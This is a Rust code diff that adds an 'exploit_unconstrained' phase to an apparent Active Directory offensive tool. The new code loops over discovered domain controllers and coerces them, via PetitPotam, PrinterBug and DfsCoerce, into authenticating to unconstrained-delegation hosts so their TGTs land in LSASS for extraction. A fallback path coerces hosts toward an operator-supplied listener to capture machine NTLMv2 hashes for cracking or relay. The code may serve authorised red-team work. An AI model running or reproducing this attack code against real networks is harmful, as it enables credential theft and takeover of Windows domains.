@@ -4,12 +4,13 @@
 //! These hosts store TGTs of any user who authenticates to them,
 //! making them high-value targets for credential theft.
 
+use crate::coerce::{self, CoerceConfig, CoerceMethod};
 use crate::runner::HuntConfig;
 use colored::Colorize;
 use overthrone_core::error::Result;
 use overthrone_core::proto::ldap;
 use serde::{Deserialize, Serialize};
-use tracing::info;
+use tracing::{info, warn};
 
 // ═══════════════════════════════════════════════════════════
 // UAC flag for unconstrained delegation
@@ -197,5 +198,195 @@ pub async fn run(config: &HuntConfig, uc: &UnconstrainedConfig) -> Result<Uncons
         vulnerable_hosts,
         domain_controllers,
         total_checked,
+    })
+}
+
+// ═══════════════════════════════════════════════════════════
+// Exploitation — coerce high-value hosts toward unconstrained targets
+// ═══════════════════════════════════════════════════════════
+
+/// Configuration for the active exploitation phase.
+#[derive(Debug, Clone)]
+pub struct ExploitUnconstrainedConfig {
+    /// Our listener IP/hostname to receive coerced auth when no unconstrained
+    /// host is available as an intermediate (fallback mode).
+    pub listener: String,
+    /// Listener port for the fallback path (default 445).
+    pub listener_port: u16,
+    /// When `true`, coerce each discovered DC to authenticate toward every
+    /// reachable unconstrained delegation host (preferred path — caches the
+    /// DC's TGT on the unconstrained host for later extraction).
+    pub coerce_dcs_to_unconstrained: bool,
+}
+
+impl Default for ExploitUnconstrainedConfig {
+    fn default() -> Self {
+        Self {
+            listener: String::new(),
+            listener_port: 445,
+            coerce_dcs_to_unconstrained: true,
+        }
+    }
+}
+
+/// Summary of the exploitation phase.
+#[derive(Debug, Clone)]
+pub struct ExploitUnconstrainedResult {
+    pub coercions_attempted: usize,
+    pub coercions_succeeded: usize,
+}
+
+/// Active exploitation of unconstrained delegation hosts.
+///
+/// Two paths are available depending on configuration:
+///
+/// **Preferred** (`coerce_dcs_to_unconstrained = true`): for each pair of
+/// (reachable unconstrained host, DC), trigger coercion from the DC toward
+/// the unconstrained host.  The DC will authenticate to the unconstrained
+/// host, whose Kerberos stack caches the DC's forwarded TGT.
+///
+/// **Fallback**: when no unconstrained hosts are reachable, coerce each
+/// discovered unconstrained host toward our own listener, capturing machine
+/// NTLMv2 hashes for offline cracking or relay.
+pub async fn exploit_unconstrained(
+    config: &HuntConfig,
+    uc_result: &UnconstrainedResult,
+    exploit_cfg: &ExploitUnconstrainedConfig,
+) -> Result<ExploitUnconstrainedResult> {
+    info!(
+        "{}",
+        "═══ UNCONSTRAINED DELEGATION EXPLOIT ═══".bold().red()
+    );
+
+    let reachable: Vec<&UnconstrainedHost> = uc_result
+        .vulnerable_hosts
+        .iter()
+        .filter(|h| h.is_reachable == Some(true))
+        .collect();
+
+    let mut coercions_attempted = 0usize;
+    let mut coercions_succeeded = 0usize;
+
+    if exploit_cfg.coerce_dcs_to_unconstrained && !reachable.is_empty() {
+        // Preferred path: coerce each DC → each reachable unconstrained host.
+        // The DC's TGT lands in the unconstrained host's LSASS for extraction.
+        for uc_host in &reachable {
+            let listener_host = uc_host
+                .dns_hostname
+                .as_deref()
+                .unwrap_or(&uc_host.sam_account_name)
+                .to_string();
+
+            for dc in &uc_result.domain_controllers {
+                let dc_target = dc
+                    .dns_hostname
+                    .as_deref()
+                    .unwrap_or(&dc.sam_account_name)
+                    .to_string();
+
+                info!(
+                    "  Coercing DC {} → unconstrained host {}",
+                    dc_target.bold(),
+                    listener_host.yellow()
+                );
+
+                let cc = CoerceConfig {
+                    target: dc_target.clone(),
+                    listener: listener_host.clone(),
+                    listener_port: 445,
+                    methods: vec![
+                        CoerceMethod::PetitPotam,
+                        CoerceMethod::PrinterBug,
+                        CoerceMethod::DfsCoerce,
+                    ],
+                    listener_path: None,
+                };
+
+                coercions_attempted += 1;
+                match coerce::run(config, &cc).await {
+                    Ok(result) if !result.successful_coercions.is_empty() => {
+                        coercions_succeeded += 1;
+                        info!(
+                            "  {} DC {} coerced → {} ({} method(s))",
+                            "★".green().bold(),
+                            dc_target,
+                            listener_host,
+                            result.successful_coercions.len()
+                        );
+                    }
+                    Ok(_) => {
+                        info!(
+                            "  DC {} — no successful coercion methods",
+                            dc_target.dimmed()
+                        );
+                    }
+                    Err(e) => {
+                        warn!("  Coercion of DC {} failed: {}", dc_target, e);
+                    }
+                }
+            }
+        }
+    } else if !exploit_cfg.listener.is_empty() {
+        // Fallback path: coerce unconstrained hosts toward our own listener.
+        // Captures machine NTLMv2 for relay/cracking.
+        for uc_host in uc_result
+            .vulnerable_hosts
+            .iter()
+            .chain(uc_result.domain_controllers.iter())
+        {
+            let target = uc_host
+                .dns_hostname
+                .as_deref()
+                .unwrap_or(&uc_host.sam_account_name)
+                .to_string();
+
+            info!(
+                "  Coercing {} → listener {}",
+                target.bold(),
+                exploit_cfg.listener.yellow()
+            );
+
+            let cc = CoerceConfig {
+                target: target.clone(),
+                listener: exploit_cfg.listener.clone(),
+                listener_port: exploit_cfg.listener_port,
+                methods: vec![
+                    CoerceMethod::PetitPotam,
+                    CoerceMethod::PrinterBug,
+                    CoerceMethod::DfsCoerce,
+                ],
+                listener_path: None,
+            };
+
+            coercions_attempted += 1;
+            match coerce::run(config, &cc).await {
+                Ok(result) if !result.successful_coercions.is_empty() => {
+                    coercions_succeeded += 1;
+                    info!(
+                        "  {} {} coerced ({} method(s))",
+                        "★".green().bold(),
+                        target,
+                        result.successful_coercions.len()
+                    );
+                }
+                Ok(_) => {}
+                Err(e) => {
+                    warn!("  Coercion of {} failed: {}", target, e);
+                }
+            }
+        }
+    } else {
+        info!("  No reachable unconstrained hosts and no fallback listener configured — skip");
+    }
+
+    info!(
+        "Exploit result: {}/{} coercions succeeded",
+        coercions_succeeded.to_string().green().bold(),
+        coercions_attempted
+    );
+
+    Ok(ExploitUnconstrainedResult {
+        coercions_attempted,
+        coercions_succeeded,
     })
 }
